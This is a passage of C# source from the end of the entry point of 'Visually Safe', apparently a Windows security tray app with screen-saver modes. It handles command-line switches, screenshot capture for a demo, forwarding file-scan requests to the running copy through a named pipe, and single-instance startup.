                            File.WriteAllText(Path.Combine(shot, "dump.txt"), sbd.ToString());
                        }
                        if (i == 5)
                        {
                            if (Environment.GetEnvironmentVariable("VISUALLYSAFE_MAPDEMO") == "1") eng.QuickScan();
                            for (int t = 0; t < 30; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); }   // build the map, start the animation
                            if (Environment.GetEnvironmentVariable("VISUALLYSAFE_MAPDEMO") == "1")
                            {
                                using (var b1 = new Bitmap(f.Width, f.Height)) { f.DrawToBitmap(b1, new Rectangle(0, 0, f.Width, f.Height)); b1.Save(Path.Combine(shot, "map1.png"), ImageFormat.Png); }
                                for (int t = 0; t < 40; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); }
                            }
                        }
                        using (var bmp = new Bitmap(f.Width, f.Height))
                        {
                            f.DrawToBitmap(bmp, new Rectangle(0, 0, f.Width, f.Height));
                            bmp.Save(Path.Combine(shot, names[i] + ".png"), ImageFormat.Png);
                        }
                    }
                }
                return 0;
            }

            // Windows screen-saver arguments: /s show, /c settings, /p preview (nothing to draw there)
            string a0 = args.Length > 0 ? args[0].ToLowerInvariant() : "";
            if (a0.StartsWith("/p") || a0.StartsWith("-p")) return 0;
            bool saverArg = a0.StartsWith("/s") || a0.StartsWith("-s") || a0 == "--saver", cfgArg = a0.StartsWith("/c") || a0.StartsWith("-c");
            string scanArg = Arg(args, "--scan-file");     // from the right-click menu: hand the file to the running Visually Safe
            if (scanArg != null)
            {
                if (!SaverPipe.TryClient(dataDir, "SCAN|" + Path.GetFullPath(scanArg), true))
                    MessageBox.Show("Visually Safe isn't running. Start it from the Start menu, then try again.", "Visually Safe", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return 0;
            }
            // the defrag screen saver is the same program under another name (VisuallySafeDefrag.scr)
            string saverCmd = Path.GetFileNameWithoutExtension(Application.ExecutablePath).IndexOf("Defrag", StringComparison.OrdinalIgnoreCase) >= 0 || args.Contains("--defrag-saver") ? "SAVER-DEFRAG" : "SAVER";
            if (saverArg && SaverPipe.TryClient(dataDir, saverCmd, true)) return 0;     // the running Visually Safe shows it
            if (cfgArg && SaverPipe.TryClient(dataDir, "SETTINGS", false)) return 0;

            // After "Turn on network monitor" the old copy is still closing; wait for it before taking over.
            string waitPid = Arg(args, "--wait-pid");
            if (waitPid != null)
                try { Process.GetProcessById(int.Parse(waitPid)).WaitForExit(15000); } catch { }
            int page = int.Parse(Arg(args, "--page") ?? "0");

            bool mine;
            using (var mutex = new System.Threading.Mutex(true, "VisuallySafe-" + dataDir.ToLowerInvariant().GetHashCode().ToString("x"), out mine))
            {
                if (!mine)
                {
                    // already running: just bring its window forward
                    if (exitAfter == 0 && !SaverPipe.TryClient(dataDir, "SHOW", false))
                        MessageBox.Show("Visually Safe is already running. Look for the shield next to the clock.", "Visually Safe");
                    return 2;
                }
                var engine = new Engine(dataDir);
                if (saverArg)
                {
                    // Visually Safe wasn't running: run just the screen saver, then leave
                    Application.Run(new SaverOnly(engine, SaverPipe.ModeOf(saverCmd)));
                    return 0;
                }
                if (cfgArg) { page = 9; }
                bool show = engine.S.FirstRun || Array.IndexOf(args, "--show") >= 0 || waitPid != null || cfgArg;
                Application.Run(new TrayApp(engine, show && exitAfter == 0, exitAfter, page));
            }
            return 0;
        }
    }
}
